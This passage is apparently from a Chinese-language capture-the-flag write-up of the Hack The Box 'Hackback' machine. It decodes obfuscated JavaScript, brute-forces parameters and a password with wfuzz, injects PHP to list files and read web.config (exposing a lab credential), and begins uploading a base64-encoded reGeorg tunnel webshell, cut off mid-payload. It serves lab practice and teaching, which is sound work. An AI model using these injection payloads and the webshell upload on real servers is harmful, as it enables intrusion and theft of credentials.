class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">var a = [&apos;\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33&apos;, &apos;\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d&apos;, &apos;\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68&apos;];</span><br><span class="line">(function(c, d) &#123;</span><br><span class="line">    var e = function(f) &#123;</span><br><span class="line">        while (--f) &#123;</span><br><span class="line">            c[&apos;push&apos;](c[&apos;shift&apos;]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    e(++d);</span><br><span class="line">&#125;(a, 0x66));</span><br><span class="line">var b = function(c, d) &#123;</span><br><span class="line">    c = c - 0x0;</span><br><span class="line">    var e = a[c];</span><br><span class="line">    if (b[&apos;MsULmv&apos;] === undefined) &#123;</span><br><span class="line">        (function() &#123;</span><br><span class="line">            var f;</span><br><span class="line">            try &#123;</span><br><span class="line">                var g = Function(&apos;return\x20(function()\x20&apos; + &apos;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&apos; + &apos;);&apos;);</span><br><span class="line">                f = g();</span><br><span class="line">            &#125; catch (h) &#123;</span><br><span class="line">                f = window;</span><br><span class="line">            &#125;</span><br><span class="line">            var i = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&apos;;</span><br><span class="line">            f[&apos;atob&apos;] || (f[&apos;atob&apos;] = function(j) &#123;</span><br><span class="line">                var k = String(j)[&apos;replace&apos;](/=+$/, &apos;&apos;);</span><br><span class="line">                for (var l = 0x0, m, n, o = 0x0, p = &apos;&apos;; n = k[&apos;charAt&apos;](o++); ~n &amp;&amp; (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String[&apos;fromCharCode&apos;](0xff &amp; m &gt;&gt; (-0x2 * l &amp; 0x6)) : 0x0) &#123;</span><br><span class="line">                    n = i[&apos;indexOf&apos;](n);</span><br><span class="line">                &#125;</span><br><span class="line">                return p;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;());</span><br><span class="line">        var q = function(r, d) &#123;</span><br><span class="line">            var t = [],</span><br><span class="line">                u = 0x0,</span><br><span class="line">                v, w = &apos;&apos;,</span><br><span class="line">                x = &apos;&apos;;</span><br><span class="line">            r = atob(r);</span><br><span class="line">            for (var y = 0x0, z = r[&apos;length&apos;]; y &lt; z; y++) &#123;</span><br><span class="line">                x += &apos;%&apos; + (&apos;00&apos; + r[&apos;charCodeAt&apos;](y)[&apos;toString&apos;](0x10))[&apos;slice&apos;](-0x2);</span><br><span class="line">            &#125;</span><br><span class="line">            r = decodeURIComponent(x);</span><br><span class="line">            for (var A = 0x0; A &lt; 0x100; A++) &#123;</span><br><span class="line">                t[A] = A;</span><br><span class="line">            &#125;</span><br><span class="line">            for (A = 0x0; A &lt; 0x100; A++) &#123;</span><br><span class="line">                u = (u + t[A] + d[&apos;charCodeAt&apos;](A % d[&apos;length&apos;])) % 0x100;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">            &#125;</span><br><span class="line">            A = 0x0;</span><br><span class="line">            u = 0x0;</span><br><span class="line">            for (var B = 0x0; B &lt; r[&apos;length&apos;]; B++) &#123;</span><br><span class="line">                A = (A + 0x1) % 0x100;</span><br><span class="line">                u = (u + t[A]) % 0x100;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">                w += String[&apos;fromCharCode&apos;](r[&apos;charCodeAt&apos;](B) ^ t[(t[A] + t[u]) % 0x100]);</span><br><span class="line">            &#125;</span><br><span class="line">            return w;</span><br><span class="line">        &#125;;</span><br><span class="line">        b[&apos;OoACcd&apos;] = q;</span><br><span class="line">        b[&apos;qSLwGk&apos;] = &#123;&#125;;</span><br><span class="line">        b[&apos;MsULmv&apos;] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    var C = b[&apos;qSLwGk&apos;][c];</span><br><span class="line">    if (C === undefined) &#123;</span><br><span class="line">        if (b[&apos;pIjlQB&apos;] === undefined) &#123;</span><br><span class="line">            b[&apos;pIjlQB&apos;] = !![];</span><br><span class="line">        &#125;</span><br><span class="line">        e = b[&apos;OoACcd&apos;](e, d);</span><br><span class="line">        b[&apos;qSLwGk&apos;][c] = e;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        e = C;</span><br><span class="line">    &#125;</span><br><span class="line">    return e;</span><br><span class="line">&#125;;</span><br><span class="line">var x = &apos;\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73&apos;;</span><br><span class="line">var z = b(&apos;0x0&apos;, &apos;\x50\x5d\x53\x36&apos;);</span><br><span class="line">var h = b(&apos;0x1&apos;, &apos;\x72\x37\x54\x59&apos;);</span><br><span class="line">var y = b(&apos;0x2&apos;, &apos;\x44\x41\x71\x67&apos;);</span><br><span class="line">var t = &apos;\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29&apos;;</span><br><span class="line">var s = &apos;\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29&apos;;</span><br><span class="line">var i = &apos;\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a&apos;;</span><br><span class="line">var k = &apos;\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d&apos;;</span><br><span class="line">var w = &apos;\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79&apos;;</span><br></pre></td></tr></table></figure></p><p>注意大小写问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nodejs</span><br><span class="line">&gt;代码-----代码</span><br><span class="line">&gt; x</span><br><span class="line">&apos;Secure Login Bypass&apos;</span><br><span class="line">&gt; z</span><br><span class="line">&apos;Remember the secret path is&apos;</span><br><span class="line">&gt; h</span><br><span class="line">&apos;2bb6916122f1da34dcd916421e531578&apos;</span><br><span class="line">&gt; y</span><br><span class="line">&apos;Just in case I loose access to the admin panel&apos;</span><br><span class="line">&gt; t</span><br><span class="line">&apos;?action=(show,list,exec,init)&apos;</span><br><span class="line">&gt; s</span><br><span class="line">&apos;&amp;site=(twitter,paypal,facebook,hackthebox)&apos;</span><br><span class="line">&gt; i</span><br><span class="line">&apos;&amp;password=********&apos;</span><br><span class="line">&gt; k</span><br><span class="line">&apos;&amp;session=&apos;</span><br><span class="line">&gt; w</span><br><span class="line">&apos;Nothing more to say&apos;</span><br></pre></td></tr></table></figure></p><p>隐藏目录<code>/2bb6916122f1da34dcd916421e531578</code>,但是被重定向了，但是这证明目录确实存在，查找目录下网页<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc 404 -t 20</span><br><span class="line">http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ</span><br><span class="line">002180:  C=403     57 L      191 W         2452 Ch        &quot;/Trace.axd&quot;</span><br><span class="line">002288:  C=302      0 L        0 W            0 Ch        &quot;/webadmin.php&quot;</span><br><span class="line">000004:  C=400     80 L      276 W         3420 Ch        &quot;/%3f/&quot;</span><br></pre></td></tr></table></figure></p><p>再来看js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var t = &apos;?action=(show,list,exec,init)&apos;;</span><br><span class="line">var s = &apos;&amp;site=(twitter,paypal,facebook,hackthebox)&apos;;</span><br><span class="line">var i = &apos;&amp;password=********&apos;;</span><br><span class="line">var k = &apos;&amp;session=&apos;;</span><br><span class="line">var w = &apos;Nothing more to say&apos;;</span><br></pre></td></tr></table></figure></p><p>将actions，sites模糊处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat actions.txt</span><br><span class="line">show</span><br><span class="line">list</span><br><span class="line">exec</span><br><span class="line">init</span><br><span class="line">root@kali:~# cat sites.txt</span><br><span class="line">twitter</span><br><span class="line">paypal</span><br><span class="line">facebook</span><br><span class="line">hackthebox</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# wfuzz -w actions.txt -w sites.txt --hc 404 &quot;http://admin.hackback.htb/2b b6916122f1da34dcd916421e531578/webadmin.php?action=FUZZ&amp;site=FUZ2Z&amp;password =test&amp;session=test&quot;</span><br></pre></td></tr></table></figure><p>得到最终结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=test&amp;session=test&apos;</span><br><span class="line">Wrong secret key!</span><br></pre></td></tr></table></figure></p><p>出现预期信息<br>测试passwd参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt &quot;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&amp;site=hackthebox&amp;password=FUZZ&quot;</span><br><span class="line">000008:  C=302      8 L       18 W          277 Ch        &quot;12345678&quot;</span><br></pre></td></tr></table></figure></p><p>最后测试session时，发现cookie不变<br><img src="https://i.loli.net/2019/07/14/5d2b0fa4a446e54147.png" alt="8.png"><br>是自己IP的SHA256哈希（我使用了两个账号，所以cookie不同）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=12345678&amp;session=bfe823095bbcc831eb7220eeb728811d7ce87e 9c1bc2b6818de43e48bcdf417a&apos;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; 0e09c819d319792545579ece736c425ed6b4a480c2f65ac6a46a5412a5aeacf5.log</span><br><span class="line">    [3] =&gt; 921c72c327ac75cd587246a9c67d06ec3f02790e59398300ef6dad16dc764170.log</span><br><span class="line">    [4] =&gt; e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>每次尝试登录<a href="http://www.hackthebox.htb就会被记录" target="_blank" rel="noopener">www.hackthebox.htb就会被记录</a></p><h2 id="PHP代码注入"><a href="#PHP代码注入" class="headerlink" title="PHP代码注入"></a>PHP代码注入</h2><p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php print_r(scandir(&apos;.&apos;)); ?&gt; #列出当前目录中的文件</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=bfe823095bbcc831eb7220eeb728811d7ce87e 9c1bc2b6818de43e48bcdf417a&apos;</span><br><span class="line">[14 July 2019, 03:11:17 PM] 10.10.12.91 - Username: Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; index.html</span><br><span class="line">    [3] =&gt; rop.aspx</span><br><span class="line">    [4] =&gt; tunnel.aspx</span><br><span class="line">    [5] =&gt; webadmin.php</span><br><span class="line">)</span><br><span class="line">, Password: 12345678</span><br></pre></td></tr></table></figure><p>ok,能够返回上一级目录<br><img src="https://i.loli.net/2019/07/14/5d2b49547b14b51058.png" alt="9.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=bfe823095bbcc831eb7220eeb728811d7ce87e 9c1bc2b6818de43e48bcdf417a&apos;</span><br><span class="line">[14 July 2019, 03:19:19 PM] 10.10.12.91 - Username: Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; 2bb6916122f1da34dcd916421e531578</span><br><span class="line">    [3] =&gt; App_Data</span><br><span class="line">    [4] =&gt; aspnet_client</span><br><span class="line">    [5] =&gt; css</span><br><span class="line">    [6] =&gt; img</span><br><span class="line">    [7] =&gt; index.php</span><br><span class="line">    [8] =&gt; js</span><br><span class="line">    [9] =&gt; logs</span><br><span class="line">    [10] =&gt; web.config</span><br><span class="line">    [11] =&gt; web.config.old</span><br><span class="line">)</span><br><span class="line">, Password: 12345678</span><br></pre></td></tr></table></figure></p><p>似乎出现了配置文件，查看<code>web.config</code>和<code>web.config.old</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents(&apos;../web.config.old&apos;); ?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/14/5d2b4cf576f0843908.png" alt="10.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl -i &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=bfe823095bbcc831eb7220eeb728811d7ce87e 9c1bc2b6818de43e48bcdf417a&apos;</span><br><span class="line">[14 July 2019, 04:35:45 PM] 10.10.12.91 - Username: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;authentication mode=&quot;Windows&quot;&gt;</span><br><span class="line">        &lt;identity impersonate=&quot;true&quot;</span><br><span class="line">            userName=&quot;simple&quot;</span><br><span class="line">            password=&quot;ZonoProprioZomaro:-(&quot;/&gt;</span><br><span class="line">     &lt;/authentication&gt;</span><br><span class="line">        &lt;directoryBrowse enabled=&quot;false&quot; showFlags=&quot;None&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">, Password: 12345678   #web.config</span><br><span class="line">--------------------------------------------------</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;authentication mode=&quot;Windows&quot;&gt;</span><br><span class="line">        &lt;identity impersonate=&quot;true&quot;</span><br><span class="line">            userName=&quot;simple&quot;</span><br><span class="line">            password=&quot;ZonoProprioZomaro:-(&quot;/&gt;</span><br><span class="line">     &lt;/authentication&gt;</span><br><span class="line">        &lt;directoryBrowse enabled=&quot;false&quot; showFlags=&quot;None&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">, Password: 12345678</span><br><span class="line">[14 July 2019, 04:42:09 PM] 10.10.12.91 - Username: &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;directoryBrowse enabled=&quot;false&quot; showFlags=&quot;None&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">, Password: 12345678  #web.config.old</span><br></pre></td></tr></table></figure></p><p>那么就得到<code>simple:ZonoProprioZomaro:-(</code></p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>线索又消失了，回到开头，查看端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.128:6666/netstat</span><br></pre></td></tr></table></figure></p><p>发现winrm，但是需要一个内部代理使我能够连接到winrm，这里将使用<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a>,将tunnel.aspx，转换为base64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;tunnel.aspx&quot;,base64_decode(&quot;PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYg